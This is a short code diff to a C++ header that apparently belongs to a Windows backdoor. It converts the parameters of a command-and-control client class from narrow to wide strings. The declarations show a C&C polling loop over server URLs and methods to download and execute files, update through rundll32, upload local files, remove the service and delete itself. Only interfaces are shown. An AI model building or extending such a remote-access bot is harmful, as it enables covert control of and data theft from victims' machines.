@@ -22,13 +22,14 @@
 #include <Windows.h>
 
 #include "service.h"
+#include "tstring.h"
 
 // This struct will be passed to connectToCCLoop
 struct CCLoop_t {
 	// current module file name
-	const char *filename;
+	const wchar_t *filename;
 	// version is used for the call to c&c
-	const char *version;
+	const wchar_t *version;
 	// wait time between two call to c&c in seconds
 	int wait;
 	// array of servers url
@@ -57,7 +58,7 @@ private:
 	// stop (set Global::SERVICE_RUNNING_EVENT)
 	bool stop();
 	// download from uri to filename
-	bool download(const char *uri, const char *filename);
+	bool download(const wchar_t *uri, const wchar_t *filename);
 
 	bool isToken(int &index, LPSTR *commands);
 	// stop and delete this file
@@ -69,16 +70,16 @@ private:
 	// remove the service
 	bool removeService();
 	// execute this file with this arguments
-	bool execute(const char *filename, const char *arguments);
+	bool execute(const wchar_t *filename, const wchar_t *arguments);
 	// download from uri to filename, and execute this file with arguements
-	bool downloadAndExecute(const char *uri, const char *filename, const char *arguments);
+	bool downloadAndExecute(const wchar_t *uri, const wchar_t *filename, const wchar_t *arguments);
 	// download a dll from uri, and call rundll32.exe dllfile InstallService
-	bool update(const char *uri, const char *filename);
+	bool update(const wchar_t *uri, const wchar_t *filename);
 
-	bool uploadFile(std::string uri, std::string localname, std::string remotename);
+	bool uploadFile(std::wstring uri, std::wstring localname, std::wstring remotename);
 
-	bool plug(const char *uri, const char *filename);
+	bool plug(const wchar_t *uri, const wchar_t *filename);
 
-	std::string getNextToken(int &index, LPSTR *commands);
+	std::wstring getNextToken(int &index, LPSTR *commands);
 
 };
